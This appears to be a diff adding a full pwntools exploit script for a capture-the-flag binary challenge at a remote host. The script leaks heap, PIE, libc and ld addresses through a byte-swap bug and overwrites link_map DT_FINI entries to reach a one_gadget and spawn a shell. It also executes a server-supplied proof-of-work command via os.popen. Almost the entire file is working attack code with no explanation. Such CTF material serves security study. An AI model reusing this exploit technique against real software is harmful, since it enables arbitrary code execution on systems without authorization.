@@ -1,0 +1,253 @@
+from pwn import *
+
+# Filter ld area to be scanned. Skip addresses that always
+# contains zero bytes. `out` file example
+'''
+0x7ff7628f0000:	0x0000000000039e80	0x0000000000000000
+0x7ff7628f0010:	0x0000000000000000	0x00007ff7627fda10
+0x7ff7628f0020 <_dl_signal_exception@got.plt>:	0x00007ff7627fd960	0x00007ff7627fd9b0
+0x7ff7628f0030 <_dl_catch_error@got.plt>:	0x00007ff7627fdb30	0x0000000000000000
+0x7ff7628f0040 <_rtld_global>:	0x00007ff7628f12e0	0x0000000000000004
+0x7ff7628f0050 <_rtld_global+16>:	0x00007ff7628f15a0	0x0000000000000000
+...
+'''
+lines = open('out', 'rb').readlines()
+ld_rw_base = 0x00007ff7628f0000
+map_offset = {}
+rev_map = {}
+for line in lines:
+    addr = line.split(b'<')[0].split(b':\t')[0]
+    offset = int(addr, 16) - ld_rw_base
+    val_1 = int(line.split(b'\t')[1], 16)
+    for idx, val in enumerate(p64(val_1)):
+        if val != 0:
+            rev_map[val] = 1
+            map_offset[offset+idx] = val
+    offset += 8
+    val_2 = int(line.split(b'\t')[2], 16)
+    for idx, val in enumerate(p64(val_2)):
+        if val != 0:
+            rev_map[val] = 1
+            map_offset[offset+idx] = val
+
+context.arch = 'amd64'
+context.encoding = 'latin'
+context.log_level = 'INFO'
+warnings.simplefilter("ignore")
+
+local_url = "localhost"
+local_port = 5000
+remote_url = "mc.ax"
+remote_port = 31040
+gdbscript = '''
+'''
+
+def conn():
+    if args.LOCAL:
+        r = remote(local_url, local_port)
+    else:
+        r = remote(remote_url, remote_port)
+
+    return r
+
+# Brute-force heap offset
+num_try = -1
+while True:
+    num_try += 1
+    print(f'{num_try = }')
+    found = False
+    try:
+        r = conn()
+
+        # POW solver
+        if not args.LOCAL:
+            r.recvuntil(b'work:\n')
+            out = r.recvline().strip()
+            proof = os.popen(out.decode()).readlines()[0].strip()
+            r.sendlineafter(b'solution: ', proof.encode())
+
+        def clap(v1,v2):
+            r.sendlineafter(b'on:', (str(v1)+' '+str(v2)).encode())
+
+        def clap_str(v1,v2):
+            r.sendlineafter(b'on:', (v1+' '+v2).encode())
+
+        def clap_bytes(v1,v2):
+            r.sendlineafter(b'on:', (v1+b' '+v2))
+
+        # BRUTEFORCE HEAP OFFSET
+        '''
+        0x075aa98
+        0x0da8a98
+        0x1613a98
+        0x1eeca98
+        '''
+        curr_heap_offset = 0x827a98
+        leak = 0x1b
+        ctr = 0x0
+
+        # Backtrack to find top_chunk, identified by the leak value is 0x51
+        # (because top chunk size value is 0x20551)
+        while leak == 0x1b:
+            curr_heap_offset -= 0x1000
+            print('offset = '+hex(curr_heap_offset))
+            clap(curr_heap_offset,0x96)
+            r.recvuntil('soul!',drop=True)
+            leak = u8(r.recv(1))
+        print('top_chunk found: '+hex(leak))
+        print('at offset = '+hex(curr_heap_offset))
+        found = leak == 0x51
+    except:
+        print(f'Failed...')
+        r.close()
+        continue
+    if found:
+        # Restore swapped value so that top chunk size isn't corrupted yet.
+        clap(curr_heap_offset,0x96)
+        break
+    else:
+        r.close()
+        continue
+
+# PIE Leak
+pie_leak=0
+for i in range(6):
+    clap(-(0x18-i),0x96)
+    r.recvuntil('soul!',drop=True)
+    pie_leak = pie_leak | ( u8(r.recv(1)) << (i*8) )
+    clap(-(0x18-i),-(0x18-i)) # restore original value
+info(f'{hex(pie_leak) = }')
+
+# Overwrite top chunk third bytes to 0,
+# resulting in top chunk size become 0x551
+curr_heap_offset += 0x2
+print(f'{hex(curr_heap_offset) = }')
+clap(curr_heap_offset, curr_heap_offset)
+print(f'Top chunk overwritten to 0x551...')
+
+# Trigger malloc in scanf, so that we will have unsorted bin
+# in the heap, and leak the libc address.
+clap_str('500', '0'*0x500+'500')
+print(f'Get unsorted bin to heap...')
+curr_heap_offset += 0x6 + 0x8
+leaked_libc=0
+for i in range(6):
+  clap(curr_heap_offset+i,0x96)
+  r.recvuntil('soul!',drop=True)
+  leaked_libc = leaked_libc | ( u8(r.recv(1)) << (i*8) )
+  clap(curr_heap_offset+i,0x96) # restore original value
+info(f'{hex(leaked_libc) = }')
+libc_base = leaked_libc - (0x21ac80+96)
+info(f'{hex(libc_base) = }')
+info(f'{hex(pie_leak) = }')
+one_gadget = (libc_base+0xebc85)
+
+# Leak dl_resolve to calculate ld_base and link_map address
+base_offset = pie_leak+0x18
+dl_resolve_got = libc_base+0x21a010
+dl_offset = dl_resolve_got - base_offset
+leaked_ld = 0
+for i in range(6):
+  clap(dl_offset+i,0x96)
+  r.recvuntil('soul!',drop=True)
+  leaked_ld = leaked_ld | ( u8(r.recv(1)) << (i*8) )
+  clap(dl_offset+i,0x96)
+info(f'{hex(leaked_ld) = }')
+ld_base = leaked_ld - 0x15d30
+info(f'{hex(ld_base) = }')
+link_map = ld_base + 0x3b2e0
+info(f'{hex(link_map) = }')
+
+# Nullify link_map->l_addr
+l_addr_offset = link_map - base_offset
+for i in range(6):
+    clap(l_addr_offset+i, l_addr_offset+i)
+print("nullify l_addr")
+
+# Nullify link_map->l_info[DT_FINI_ARRAY]
+dt_fini_array_offset = link_map+0x0110 - base_offset
+for i in range(6):
+    clap(dt_fini_array_offset+i, dt_fini_array_offset+i)
+print("nullify dt_fini")
+
+# Overwrite link_map->l_info[DT_FINI] with l_name
+# We will use the `l_name` stored address as our link_map->l_info[DT_FINI] value
+l_name_offset = link_map+0x8 - base_offset
+dt_fini_offset = link_map+0xa8 - base_offset
+for i in range(0x8):
+    clap(dt_fini_offset+i, dt_fini_offset+i)
+for i in range(6):
+  clap(l_name_offset+i,dt_fini_offset+i)
+print("finish overwrite")
+
+# Leak link_map->l_info[DT_FINI] value that just got overwritten
+leaked_dt_fini = 0
+dt_fini_offset = link_map+0xa8 - base_offset
+for i in range(6):
+  clap(dt_fini_offset+i,0x96)
+  r.recvuntil('soul!',drop=True)
+  leaked_dt_fini = leaked_dt_fini | ( u8(r.recv(1)) << (i*8) )
+  clap(dt_fini_offset+i,0x96)
+info(f'{hex(leaked_dt_fini) = }')
+
+# Set one_gadget in link_map->l_info[DT_FINI]->d_un.d_ptr
+target_offset = leaked_dt_fini+0x8 - base_offset
+for i in range(0x8):
+    clap(target_offset+i, target_offset+i)
+## Set higher 3 bytes, taken from one of the values stored in libc rw area
+from_offset = libc_base+0x21b518 - base_offset
+for i in range(3, 6):
+    clap(from_offset+i,target_offset+i)
+print("partial")
+
+## Set 1st byte
+target_offset = leaked_dt_fini+0x8 - base_offset
+clap(ld_base-0x15f8 - base_offset, target_offset)
+print("1st byte")
+
+## Set 2nd byte
+target_offset = leaked_dt_fini+0x8+1 - base_offset
+clap(ld_base+0x3b091 - base_offset, target_offset)
+print("2nd byte")
+
+## Search 3rd byte
+print('searching last byte')
+last = (one_gadget>>16) & 0xff
+print(f'{hex(last) = }')
+offset = ld_base+0x3a000
+count = 0
+correct_offset = 0
+for key, _ in map_offset.items():
+    clap(offset+key - base_offset, 0x96)
+    r.recvuntil('soul!',drop=True)
+    temp = r.recvuntil(b'\x1b')
+    if (temp[0] == 0x1b) and (len(temp)==1):
+        val = 0
+    else:
+        val = temp[0]
+    clap(offset+key - base_offset , 0x96)
+    print('count = '+hex(count), f'{hex(key) = }, {hex(last) = }, {hex(val)}')
+    if val == last:
+        correct_offset = offset+key
+        break
+    count += 1
+
+## Set 3rd byte
+target_offset = leaked_dt_fini+0xa - base_offset
+clap(correct_offset - base_offset, target_offset)
+print("3rd byte")
+
+# Just to validate that our write is success
+target_offset = leaked_dt_fini+0x8 - base_offset
+test_valzz = 0
+for i in range(6):
+    clap(target_offset+i, 0x96)
+    r.recvuntil('soul!',drop=True)
+    test_valzz = test_valzz | ( u8(r.recv(1)) << (i*8) )
+    clap(target_offset+i,0x96)
+info(f'{hex(one_gadget) = }')
+info(f'{hex(test_valzz) = }')
+clap(0, 0)
+
+r.interactive()
+
